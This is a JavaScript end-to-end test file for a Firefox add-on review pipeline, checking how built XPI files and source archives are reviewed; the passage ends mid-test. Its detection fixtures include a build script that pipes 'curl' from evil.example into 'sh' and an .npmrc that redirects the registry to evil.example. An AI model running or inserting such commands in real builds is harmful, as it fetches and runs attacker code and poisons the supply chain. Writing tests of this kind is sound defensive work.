// End-to-end test for SCA mode (source code archive): the positional XPI is the
// SHIPPED artifact (manifest + reachability + WAR + bundled-files resolve against
// it), while the readable --sca-source tree is the review target the code checks
// analyze. The built layout deliberately differs from the source layout - the XPI's
// entry scripts are named differently than the source's - which is the case that
// stresses the shipped/review-target split.

import { test, mock } from "node:test";
import { REVIEW_MODE } from "../../src/lib/enum.js";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import { runPipeline } from "../../src/pipeline.js";
import { formatReviewBody } from "../../src/report/format.js";
import { fixtureCacheOpts } from "../seed-caches.js";

// A cache pre-seeded from the fixtures so the schema / experiments / library-hash
// fetches all hit disk - these runs stay offline.
const OFFLINE = fixtureCacheOpts();

function tmpDir(files) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "wrr-sca-"));
  for (const [name, content] of Object.entries(files)) {
    const dest = path.join(dir, name);
    fs.mkdirSync(path.dirname(dest), { recursive: true });
    fs.writeFileSync(dest, content);
  }
  return dir;
}

// The SHIPPED XPI: built entry scripts (background.js / content.js) that load a
// web-accessible resource. This is a self-consistent built add-on. background.js ships
// MINIFIED (first-party, one dense line) so the XPI is not directly reviewable - which is
// what makes an SCA submission legitimate. An XPI whose first-party code is readable is
// downgraded to a plain XPI review (sca-not-required), so these SCA-mode tests need one.
const XPI_FILES = {
  "manifest.json": JSON.stringify({
    manifest_version: 3,
    name: "SCA E2E",
    version: "1.0",
    background: { scripts: ["background.js"] },
    content_scripts: [{ matches: ["*://*/*"], js: ["content.js"] }],
    web_accessible_resources: [
      { resources: ["injected.js"], matches: ["*://*/*"] },
    ],
  }),
  "background.js": `var s=0;${"s=s+1;".repeat(240)}console.log("built bg",s);`,
  "content.js": `const u=browser.runtime.getURL("injected.js");const s=document.createElement("script");s.src=u;document.head.append(s);`,
  "injected.js": `console.log("built injected");`,
};

// The readable SOURCE: a different pre-build layout (entry file named main.js, not
// the manifest's background.js), carrying a real WebExtension API defect.
const SRC_FILES = {
  "package.json": JSON.stringify({ name: "sca-e2e", version: "1.0.0" }),
  "src/main.js": `browser.totallyFakeNamespace.doThing();\n`,
  "src/content.js": `browser.runtime.getURL("injected.js");\n`,
  "src/injected.js": `console.log("source injected");\n`,
};

const has = (findings, ruleId, pred = () => true) =>
  findings.some((f) => f.ruleId === ruleId && pred(f));

// A FLAT layout: manifest.json + the source + the build tooling all sit at --sca-root,
// with no nested subfolder to name. --sca-source is then "." (or an absolute path equal
// to --sca-root). The whole submission is accepted and fully reviewed: the code checks
// review the root source, and the build review still traces the build off the root
// package.json (so a root yarn.lock is caught) - no source/build subfolder needed.
const FLAT_SRC = {
  "manifest.json": JSON.stringify({
    manifest_version: 3,
    name: "Flat",
    version: "1.0",
    background: { scripts: ["app.js"] },
  }),
  "app.js": `browser.totallyFakeNamespace.doThing();\n`,
  "package.json": JSON.stringify({
    name: "flat-sca",
    version: "1.0.0",
    scripts: { build: "web-ext build" },
  }),
  "yarn.lock": "# yarn lockfile v1\n",
};

test("SCA e2e: a flat layout (--sca-source == --sca-root) is accepted and fully reviewed", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir(FLAT_SRC);
  try {
    // "." and an absolute path equal to --sca-root both resolve to the root.
    for (const scaSource of [".", src]) {
      const { findings, meta } = await runPipeline({
        addonPath: xpi,
        scaRoot: src,
        scaSource,
        ...OFFLINE,
      });
      assert.equal(
        meta.reviewed,
        true,
        "the flat submission is reviewed, not rejected"
      );
      // The code checks review the root source: the fake API in app.js is caught.
      assert.ok(
        has(
          findings,
          "unknown-api",
          (f) => f.file === "app.js" && /totallyFakeNamespace/.test(f.item)
        ),
        "the root source file is reviewed by the code checks"
      );
      // The build review works flat: selectScaBuildFiles fed the corpus off the root
      // package.json, so the root yarn.lock is an Unsupported build tool reject.
      assert.ok(
        has(findings, "unsupported-build-tool", (f) => /yarn/.test(f.message)),
        "the root yarn.lock is flagged (the build review runs in a flat layout)"
      );
    }
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

// The rendered SCA report labels each finding's file:line by artifact and closes the
// Issues section with the legend footer - proving runPipeline threads `mode` +
// `ruleInputs` into the report (formatReviewBody). An XPI review has neither.
test("SCA e2e: the rendered report carries [XPI]/[SCA] labels + the footer", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...FLAT_SRC,
    "app.js": `browser.totallyFakeNamespace.doThing();\n`, // a source (SCA) finding
  });
  try {
    const result = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    });
    const report = formatReviewBody(result);
    assert.match(
      report,
      /\[SCA\] app\.js/,
      "a source finding is labelled [SCA]"
    );
    assert.match(
      report,
      /\[XPI\] = source file in the submitted XPI/,
      "the Issues section closes with the artifact legend"
    );
    // The pipeline exposes the mode + rule inputs for the report layer.
    assert.equal(result.mode, REVIEW_MODE.SCA);
    assert.equal(result.ruleInputs.get("unused-files"), "xpi");
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// MODE-INVARIANCE: the built XPI is analysed the SAME way whether it is reviewed inside an
// SCA submission (a second artifact) or as a standalone XPI review (the review target). So
// the input:xpi checks - which read siblings.xpi's classification, reachability, and (now)
// api-usage - must produce the IDENTICAL findings for the same XPI in either mode. That is
// the whole point of building siblings.xpi one way regardless of mode; without it an
// input:xpi finding could silently depend on how the run was invoked.
test("SCA e2e: the built XPI's input:xpi findings match a standalone XPI review of it", async () => {
  // orphan.js is unreferenced in the XPI -> a deterministic unused-files (input:xpi) finding,
  // so the comparison is non-vacuous.
  const xpi = tmpDir({
    ...XPI_FILES,
    "orphan.js": `console.log("nobody imports me");\n`,
  });
  const src = tmpDir(SRC_FILES);
  try {
    const sca = await runPipeline({ addonPath: xpi, scaRoot: src, ...OFFLINE });
    const xpiOnly = await runPipeline({ addonPath: xpi, ...OFFLINE });
    assert.equal(
      sca.mode,
      REVIEW_MODE.SCA,
      "the minified XPI keeps the review in SCA mode"
    );

    // The findings from input:xpi rules only (ruleInputs is the static registry map, the same
    // in both runs). In the standalone XPI review the source IS the XPI, so its input:source
    // checks also run - filtering to input:xpi isolates the shipped-artifact analysis.
    const xpiFindings = (r) =>
      r.findings
        .filter((f) => r.ruleInputs.get(f.ruleId) === "xpi")
        .map((f) => `${f.ruleId}|${f.file}|${f.item ?? f.loc ?? ""}`)
        .sort();

    const inSca = xpiFindings(sca);
    assert.ok(
      inSca.includes("unused-files|orphan.js|"),
      "the orphaned XPI file is flagged unused (a real input:xpi finding fired)"
    );
    assert.deepEqual(
      inSca,
      xpiFindings(xpiOnly),
      "the built XPI's input:xpi findings are identical in SCA and standalone-XPI review"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// --sca-root alone (no --sca-source) switches to SCA mode and defaults the source to
// ".", so a flat submission needs only the one flag - identical to passing --sca-source ".".
test("SCA e2e: --sca-root without --sca-source defaults the source to '.'", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir(FLAT_SRC);
  try {
    const { findings, meta } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      // no scaSource - defaults to "."
      ...OFFLINE,
    });
    assert.equal(meta.reviewed, true, "SCA mode engaged from --sca-root alone");
    // The root source is reviewed (proves mode === "sca", source === the root).
    assert.ok(
      has(
        findings,
        "unknown-api",
        (f) => f.file === "app.js" && /totallyFakeNamespace/.test(f.item)
      ),
      "the root source file is reviewed"
    );
    // The build review ran (SCA-only), so the root yarn.lock is rejected.
    assert.ok(
      has(findings, "unsupported-build-tool", (f) => /yarn/.test(f.message)),
      "the SCA build review ran with --sca-root alone"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// The dependency audit reads the root package.json, which in a flat layout IS the review
// addon's own package.json - so resolveVendor + the vendor checks run exactly as in a
// nested layout. A vulnerable devDependency is surfaced by vendor-vulnerable-dev.
test("SCA e2e: a flat layout audits the root package.json dependencies", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...FLAT_SRC,
    "package.json": JSON.stringify({
      name: "flat-sca",
      version: "1.0.0",
      devDependencies: { "build-tool": "1.0.0" },
    }),
  });
  const vendorNet = {
    fetchBytes: async () => Buffer.from(""),
    fetchJson: async () => ({}),
    postJson: async (_url, body) =>
      body?.package?.name === "build-tool"
        ? {
            vulns: [
              {
                id: "GHSA-flat-0000-0000",
                aliases: ["CVE-2021-9999"],
                database_specific: { severity: "HIGH" },
                affected: [
                  {
                    package: { ecosystem: "npm", name: "build-tool" },
                    ranges: [
                      {
                        type: "SEMVER",
                        events: [{ introduced: "0" }, { fixed: "2.0.0" }],
                      },
                    ],
                  },
                ],
              },
            ],
          }
        : { vulns: [] },
  };
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      scaSource: ".",
      ...OFFLINE,
      vendorNet,
    });
    assert.ok(
      has(findings, "vendor-vulnerable-dev", (f) => /build-tool/.test(f.item)),
      "the root package.json's dependencies are audited in a flat layout"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A third-party library bundled into the readable SOURCE (a committed copy the Mozilla
// hash DB misses) that is NOT declared in package.json now gets the full identification the
// XPI review already ran: a jsDelivr content-hash match (so it is recognized as a library -
// excluded from content review, not rejected by minified-code) and an OSV audit (so a
// vulnerable one is caught by vendor-vulnerable). On HEAD the SCA source got no CDN/OSV pass,
// so this file would be rejected as minified and its vulnerability missed.
test("SCA e2e: an undeclared source-bundled library is CDN-identified and OSV-audited", async () => {
  const LIB = `var s=0;${"s=s+1;".repeat(240)}`; // one dense line of statements -> minified
  const { rawSha256 } = await import("../../src/normalize/hash.js");
  const libHash = rawSha256(Buffer.from(LIB));
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    "manifest.json": JSON.stringify({
      manifest_version: 3,
      name: "L",
      version: "1.0",
      background: { scripts: ["app.js"] },
    }),
    "app.js": "console.log('app');\n",
    "vendor/lib.min.js": LIB, // undeclared: not in package.json
    "package.json": JSON.stringify({ name: "l", version: "1.0.0" }),
  });
  // A net that recognizes the vendored file's hash on jsDelivr (popular) and returns an OSV
  // advisory for it - so it is identified AND audited.
  const vendorNet = {
    fetchBytes: async () => Buffer.from(""),
    fetchJson: async (url) => {
      if (url.includes("api.npmjs.org/downloads/")) {
        return { downloads: 50000 };
      }
      if (url.includes("api.github.com/repos/")) {
        return { stargazers_count: 5000 };
      }
      if (url.split("/").pop() === libHash) {
        return {
          type: "npm",
          name: "leftpad",
          version: "1.0.0",
          file: "/lib.min.js",
        };
      }
      throw new Error("HTTP 404");
    },
    postJson: async (_url, body) =>
      body?.package?.name === "leftpad"
        ? {
            vulns: [
              {
                id: "GHSA-lib-0000-0000",
                aliases: ["CVE-2020-0001"],
                database_specific: { severity: "HIGH" },
                affected: [
                  {
                    package: { ecosystem: "npm", name: "leftpad" },
                    ranges: [
                      {
                        type: "SEMVER",
                        events: [{ introduced: "0" }, { fixed: "2.0.0" }],
                      },
                    ],
                  },
                ],
              },
            ],
          }
        : { vulns: [] },
  };
  const cdnCache = fs.mkdtempSync(path.join(os.tmpdir(), "wrr-cdn-"));
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      scaSource: ".",
      ...OFFLINE,
      vendorNet,
      cdnLookupCache: cdnCache,
    });
    // Identified on the CDN -> library -> exempt from minified-code (which would reject an
    // unrecognized minified file in the readable source).
    assert.ok(
      !has(findings, "minified-code", (f) => /lib\.min\.js/.test(f.file)),
      "the CDN-identified source library is not rejected as minified"
    );
    // OSV-audited on the SOURCE -> vendor-vulnerable (would not fire on HEAD).
    assert.ok(
      has(findings, "vendor-vulnerable", (f) => /leftpad/.test(f.item ?? "")),
      "the undeclared source-bundled library is OSV-audited"
    );
  } finally {
    [xpi, src, cdnCache].forEach((d) =>
      fs.rmSync(d, { recursive: true, force: true })
    );
  }
});

// Regression: the --sca-root tree is read ONCE and the archive is shared by the review
// loader (loadScaAddon) and the build-corpus loader (selectScaBuildFiles), so it is not
// walked (nor its symlinks warned) twice. Before the dedupe each loader called
// loadAddon(scaRoot), reading the root twice.
test("SCA: the --sca-root archive is read once, not twice", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir(SRC_FILES);
  const realReaddir = fs.readdirSync;
  let rootReads = 0;
  mock.method(fs, "readdirSync", (p, ...rest) => {
    if (path.resolve(p) === path.resolve(src)) {
      rootReads += 1;
    }
    return realReaddir(p, ...rest);
  });
  try {
    await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      scaSource: "src",
      ...OFFLINE,
    });
    assert.equal(rootReads, 1, "--sca-root walked once, not twice");
  } finally {
    mock.restoreAll();
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

test("SCA e2e: code checks review the source; manifest/WAR resolve against the XPI", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir(SRC_FILES);
  try {
    const result = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      scaSource: "src",
      ...OFFLINE,
    });
    const { findings } = result;

    // (1) Code checks review ALL the source: a fake API in main.js - a file the
    // XPI manifest never names (so it is unreachable from the built entry points) -
    // is still caught, because the SCA code checks review every source file.
    assert.ok(
      has(
        findings,
        "unknown-api",
        (f) => f.file === "main.js" && /totallyFakeNamespace/.test(f.item)
      ),
      "expected unknown-api on the non-entry source file main.js"
    );

    // (2) bundled-files resolves manifest refs against the XPI: background.js is a
    // built entry present in the XPI but absent from the source tree, so it must
    // NOT be reported as "not bundled".
    assert.ok(
      !has(findings, "bundled-files", (f) => /background\.js/.test(f.item)),
      "background.js (a built entry) must not be flagged as unbundled"
    );

    // (3) minimize-WAR / reachability judged over the XPI: injected.js is loaded by
    // the XPI's own content script, so the exposure is needed - no false finding.
    assert.ok(
      !has(findings, "minimize-web-accessible-resources"),
      "injected.js is loaded by the shipped content script - no WAR finding"
    );

    assert.equal(result.meta.reviewed, true);
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

test("SCA e2e: --sca-exp-source excludes the Experiment subtree from the code checks", async () => {
  const xpi = tmpDir(XPI_FILES);
  // Source carries a privileged Experiment file (ChromeUtils) under experiments/.
  const src = tmpDir({
    ...SRC_FILES,
    "src/experiments/exp.js": `ChromeUtils.importESModule("resource:///x.sys.mjs");\n`,
  });
  try {
    const base = {
      addonPath: xpi,
      scaRoot: src,
      scaSource: "src",
      ...OFFLINE,
    };
    // Without the flag, the privileged Experiment code is reviewed as WebExtension
    // code and false-positives core-symbol-in-webext.
    const without = await runPipeline(base);
    assert.ok(
      has(
        without.findings,
        "core-symbol-in-webext",
        (f) => f.file === "experiments/exp.js"
      ),
      "without --sca-exp-source the experiment file is (falsely) flagged"
    );

    // With the flag - relative to --sca-root, like --sca-source (so "src/experiments",
    // NOT "experiments") - the experiment subtree is excluded, no false positive, while
    // the real defect in main.js is still caught.
    const withExp = await runPipeline({
      ...base,
      scaExpSource: "src/experiments",
    });
    assert.ok(
      !has(
        withExp.findings,
        "core-symbol-in-webext",
        (f) => f.file === "experiments/exp.js"
      ),
      "with --sca-exp-source the experiment subtree is excluded"
    );
    assert.ok(
      has(withExp.findings, "unknown-api", (f) => f.file === "main.js"),
      "the WebExtension code is still reviewed with --sca-exp-source"
    );

    // Both source flags also accept an absolute path (same --sca-root base).
    const withAbs = await runPipeline({
      ...base,
      scaExpSource: path.join(src, "src", "experiments"),
    });
    assert.ok(
      !has(
        withAbs.findings,
        "core-symbol-in-webext",
        (f) => f.file === "experiments/exp.js"
      ),
      "an absolute --sca-exp-source is accepted and excludes the subtree"
    );
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

test("SCA e2e: --sca-exp-source may be a sibling of --sca-source under --sca-root", async () => {
  const xpi = tmpDir(XPI_FILES);
  // The Experiment lives OUTSIDE the review source (src/), as a sibling under --sca-root.
  // This is the layout that used to throw "must be a folder within --sca-source".
  const src = tmpDir({
    ...SRC_FILES,
    "experiment/exp.js": `ChromeUtils.importESModule("resource:///x.sys.mjs");\n`,
  });
  try {
    const base = { addonPath: xpi, scaRoot: src, scaSource: "src", ...OFFLINE };
    // Accepted (no throw) whether the sibling folder is named relative to --sca-root or
    // by an absolute path.
    for (const scaExpSource of ["experiment", path.join(src, "experiment")]) {
      const res = await runPipeline({ ...base, scaExpSource });
      // The review source is still reviewed...
      assert.ok(
        has(res.findings, "unknown-api", (f) => f.file === "main.js"),
        "the WebExtension source is reviewed with a sibling --sca-exp-source"
      );
      // ...and the out-of-source Experiment is never reviewed as WebExtension code (it is
      // not part of the scaSource subtree, so nothing false-positives on ChromeUtils).
      assert.ok(
        !has(res.findings, "core-symbol-in-webext"),
        "the sibling Experiment is not reviewed as WebExtension code"
      );
    }
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

test("SCA e2e: unused-files flags the build's dead files, not source scaffolding", async () => {
  // The XPI ships a file no entry point reaches; the source repo has its own
  // unreferenced scaffolding that never ships.
  const xpi = tmpDir({
    ...XPI_FILES,
    "orphan.js": `console.log("dead weight in the build");`,
  });
  const src = tmpDir({
    ...SRC_FILES,
    "src/leftover-config.js": `console.log("unreferenced source scaffolding");`,
  });
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      scaSource: "src",
      ...OFFLINE,
    });
    // unused-files describes the SHIPPED artifact: the XPI's dead file is flagged...
    assert.ok(
      has(findings, "unused-files", (f) => f.file === "orphan.js"),
      "expected the XPI's dead file to be flagged"
    );
    // ...but the source repo's unreferenced scaffolding never ships, so it is not.
    assert.ok(
      !findings.some((f) => f.file === "leftover-config.js"),
      "source-repo scaffolding must not be flagged in SCA"
    );
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

test("SCA e2e: --diff-to diffs the built XPI against the baseline XPI, not the source", async () => {
  // The baseline XPI and the new (positional) XPI differ ONLY in strict_max_version.
  const manifest = (smax) =>
    JSON.stringify({
      manifest_version: 3,
      name: "SCA Diff",
      version: "1.0",
      background: { scripts: ["background.js"] },
      browser_specific_settings: {
        gecko: { id: "diff@sca", strict_max_version: smax },
      },
    });
  const oldXpi = tmpDir({
    "manifest.json": manifest("100.0"),
    "background.js": `console.log("v1");`,
  });
  const newXpi = tmpDir({
    "manifest.json": manifest("110.0"),
    "background.js": `console.log("v1");`,
  });
  // The readable source is a different layout - the diff must ignore it entirely.
  const src = tmpDir(SRC_FILES);
  try {
    const { findings } = await runPipeline({
      addonPath: newXpi,
      scaRoot: src,
      scaSource: "src",
      diffTo: oldXpi,
      ...OFFLINE,
    });
    // Only strict_max_version moved between the two XPIs, so the bump-only diff
    // fires - proving --diff-to compared the built XPIs, not the source tree (whose
    // files share nothing byte-identical with the XPI and would suppress it).
    assert.ok(
      has(findings, "strict-max-version-bump-only"),
      "expected the version-bump diff to fire against the XPI baseline in SCA"
    );
  } finally {
    [oldXpi, newXpi, src].forEach((d) =>
      fs.rmSync(d, { recursive: true, force: true })
    );
  }
});

test("SCA e2e: locale checks evaluate _locales against the XPI, not the source", async () => {
  // The XPI ships _locales/en (as a build would); the readable source tree does
  // not (generated, or kept outside --sca-source).
  const xpi = tmpDir({
    "manifest.json": JSON.stringify({
      manifest_version: 3,
      name: "L",
      version: "1.0",
      default_locale: "en",
      background: { scripts: ["bg.js"] },
    }),
    "bg.js": `console.log(1);`,
    "_locales/en/messages.json": `{"name":{"message":"L"}}`,
  });
  const src = tmpDir(SRC_FILES); // no _locales in the source
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      scaSource: "src",
      ...OFFLINE,
    });
    // The shipped XPI satisfies default_locale, so there is no false reject - even
    // though the source has no _locales directory.
    assert.ok(
      !has(findings, "default-locale-unused"),
      "default_locale must be checked against the XPI's _locales, not the source"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

test("SCA e2e: missing-english-localization checks the XPI's _locales, not source text", async () => {
  // The shipped XPI ships an English locale; the source has no _locales and its
  // visible text is German. The check must see the XPI's English locale and pass,
  // not language-detect the source text and falsely flag a non-English add-on.
  const xpi = tmpDir({
    "manifest.json": JSON.stringify({
      manifest_version: 3,
      name: "L",
      version: "1.0",
      default_locale: "en",
      background: { scripts: ["bg.js"] },
    }),
    "bg.js": `console.log(1);`,
    "_locales/en/messages.json": `{"name":{"message":"L"}}`,
  });
  const src = tmpDir({
    ...SRC_FILES,
    "src/popup.html": `<html><body><h1>Willkommen bei unserer Erweiterung</h1><p>Diese Anwendung verwaltet Ihre Nachrichten und Einstellungen sorgfaeltig und zuverlaessig.</p></body></html>`,
  });
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      scaSource: "src",
      ...OFFLINE,
    });
    assert.ok(
      !has(findings, "missing-english-localization"),
      "the XPI's English _locales must satisfy the check, not the German source text"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

test("SCA e2e: background-module judges the XPI's background script, not the ESM source", async () => {
  const manifest = JSON.stringify({
    manifest_version: 3,
    name: "B",
    version: "1.0",
    background: { scripts: ["background.js"] }, // no type: module
  });
  // (a) The source uses ESM, but the build bundles it to a CLASSIC shipped script,
  // so the manifest correctly omits type:module. Reading the source would
  // false-positive; reading the shipped classic script does not.
  const xpiClassic = tmpDir({
    "manifest.json": manifest,
    "background.js": `(function () { console.log("bundled classic"); })();`,
  });
  const srcEsm = tmpDir({
    "package.json": "{}",
    "src/background.js": `import { x } from "./util.js";\nconsole.log(x);`,
    "src/util.js": `export const x = 1;`,
  });
  // (b) The shipped script genuinely IS ESM (e.g. a rollup --format es bundle) with
  // no type:module - a real loading defect the check must still catch over the XPI.
  const xpiEsm = tmpDir({
    "manifest.json": manifest,
    "background.js": `import { x } from "./util.js";\nconsole.log(x);`,
    "util.js": `export const x = 1;`,
  });
  try {
    const a = await runPipeline({
      addonPath: xpiClassic,
      scaRoot: srcEsm,
      scaSource: "src",
      ...OFFLINE,
    });
    assert.ok(
      !has(a.findings, "background-module"),
      "an ESM source bundled to a classic shipped script must not false-positive"
    );
    const b = await runPipeline({
      addonPath: xpiEsm,
      scaRoot: srcEsm,
      scaSource: "src",
      ...OFFLINE,
    });
    assert.ok(
      has(b.findings, "background-module"),
      "a genuinely-ESM shipped background script with no type:module is still caught"
    );
  } finally {
    [xpiClassic, srcEsm, xpiEsm].forEach((d) =>
      fs.rmSync(d, { recursive: true, force: true })
    );
  }
});

test("SCA e2e: trademark-violation resolves a localized name via the XPI's _locales", async () => {
  // The displayed name is a __MSG_ placeholder resolved from the XPI's _locales to
  // a trademark-violating string; the source has no _locales. The check must
  // resolve against the shipped XPI, not silently miss it over the source.
  const xpi = tmpDir({
    "manifest.json": JSON.stringify({
      manifest_version: 3,
      name: "__MSG_extName__",
      version: "1.0",
      default_locale: "en",
      background: { scripts: ["bg.js"] },
    }),
    "bg.js": `console.log(1);`,
    "_locales/en/messages.json": `{"extName":{"message":"Firefox Helper"}}`,
  });
  const src = tmpDir(SRC_FILES); // no _locales in the source
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      scaSource: "src",
      ...OFFLINE,
    });
    assert.ok(
      has(findings, "trademark-violation"),
      "a localized trademark-violating name must be caught via the XPI's _locales"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A vulnerable devDependency is a real risk in SCA because the reviewer builds the
// add-on from source. The dedicated vendor-vulnerable-dev check (sca:true) runs
// only here - it OSV-audits the root package.json's devDependencies and surfaces
// the hit, while the prod vendor-vulnerable check stays silent for a dev-only dep.
test("SCA e2e: a vulnerable devDependency is flagged by vendor-vulnerable-dev", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "package.json": JSON.stringify({
      name: "sca-e2e",
      version: "1.0.0",
      devDependencies: { "build-tool": "1.0.0" },
    }),
  });
  // Injected OSV transport: one HIGH advisory for the dev dep, fixed in 2.0.0.
  const vendorNet = {
    fetchBytes: async () => Buffer.from(""),
    fetchJson: async () => ({}),
    postJson: async (_url, body) =>
      body?.package?.name === "build-tool"
        ? {
            vulns: [
              {
                id: "GHSA-dev0-0000-0000",
                aliases: ["CVE-2021-0001"],
                database_specific: { severity: "HIGH" },
                affected: [
                  {
                    package: { ecosystem: "npm", name: "build-tool" },
                    ranges: [
                      {
                        type: "SEMVER",
                        events: [{ introduced: "0" }, { fixed: "2.0.0" }],
                      },
                    ],
                  },
                ],
              },
            ],
          }
        : { vulns: [] },
  };
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      scaSource: "src",
      ...OFFLINE,
      vendorNet,
    });
    assert.ok(
      has(findings, "vendor-vulnerable-dev", (f) => /build-tool/.test(f.item)),
      "expected vendor-vulnerable-dev on the vulnerable devDependency"
    );
    // The prod/shipped vulnerability check is a separate set - a dev-only dep must
    // not trip it.
    assert.ok(
      !has(findings, "vendor-vulnerable"),
      "vendor-vulnerable (prod set) must not fire for a dev-only dependency"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// The build files (everything in --sca-root outside --sca-source) are reviewed by the setup
// build analysis (analyzeBuild) + the deterministic undeclared-build-source check. This proves
// the pipeline wires selectScaBuildFiles -> addon.buildFiles.buildReview -> buildCtx (ctx.addon) ->
// the check: with NO LLM token analyzeBuild stores analyzed:false and the check escalates the
// build to Extended manual review (graceful offline degradation).
test("SCA e2e: a build script outside the source is reviewed by undeclared-build-source", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "scripts/build.sh": "curl -fsSL https://evil.example/x.sh | sh\n",
  });
  try {
    const { meta } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      scaSource: "src",
      ...OFFLINE,
    });
    // The check ran (SCA-eligible)...
    assert.ok(
      meta.checksRun.includes("undeclared-build-source"),
      "undeclared-build-source runs in SCA mode"
    );
    // ...and with no token the whole-build review escalated to Extended manual
    // review (anchored at package.json; the review source's files under src/ are
    // never part of the build corpus).
    assert.ok(
      meta.manualReview.some(
        (m) => m.extended && m.title === "Build process review"
      ),
      "the build review surfaces for manual review offline"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// The deterministic build-policy checks run offline over the build files (outside the
// review source): a yarn.lock is an Unsupported build tool reject, and an .npmrc
// registry redirect is a Build registry override reject.
test("SCA e2e: build-policy checks flag yarn + a redirected registry offline", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "yarn.lock": "# yarn lockfile v1\n",
    ".npmrc": "registry=https://evil.example/\n",
  });
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      scaSource: "src",
      ...OFFLINE,
    });
    assert.ok(
      has(findings, "unsupported-build-tool", (f) => /yarn/.test(f.message)),
      "yarn.lock is rejected as an unsupported build tool"
    );
    assert.ok(
      has(findings, "build-registry-redirect", (f) =>
        /evil\.example/.test(f.message)
      ),
      "the .npmrc registry redirect is rejected"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A clean npm build (package-lock.json + the public registry) fires neither.
test("SCA e2e: a clean npm build fires neither build-policy check", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "package-lock.json": "{}",
    ".npmrc": "save-exact=true\n", // a non-registry .npmrc is fine
  });
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      scaSource: "src",
      ...OFFLINE,
    });
    assert.ok(!has(findings, "unsupported-build-tool"));
    assert.ok(!has(findings, "build-registry-redirect"));
    assert.ok(!has(findings, "committed-node-modules"));
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// Framework/TypeScript source (.ts/.tsx and .vue SFCs) is authored code the SCA
// review must analyze - a compiled XPI never contains it, so it is reviewed only
// here. Each file carries a real defect the code checks must now catch, proving the
// source is parsed (TS/JSX) and, for the SFC, that its <script> and its v-html
// template binding are both scanned.
test("SCA e2e: TypeScript and Vue source is parsed and its defects are caught", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    // .ts with a type annotation: a fake API. If TS did not parse, the file would
    // fatal and no API usage would resolve - so unknown-api firing proves parsing.
    "src/api.ts": `const n: number = 1;\nbrowser.totallyFakeNamespace.doThing(n);\n`,
    // .tsx React component writing to an innerHTML sink.
    "src/Widget.tsx": `export const W = () => {\n  document.body.innerHTML = props.raw;\n  return <div/>;\n};\n`,
    // .vue SFC: a v-html template binding (an innerHTML-equivalent sink).
    "src/Comp.vue": `<script setup lang="ts">\nconst raw: string = get();\n</script>\n\n<template>\n  <div v-html="raw"></div>\n</template>\n`,
  });
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      scaSource: "src",
      ...OFFLINE,
    });
    // (1) The .ts file is parsed and API-resolved.
    assert.ok(
      has(
        findings,
        "unknown-api",
        (f) => f.file === "api.ts" && /totallyFakeNamespace/.test(f.item)
      ),
      "the .ts source is parsed and its fake API is flagged"
    );
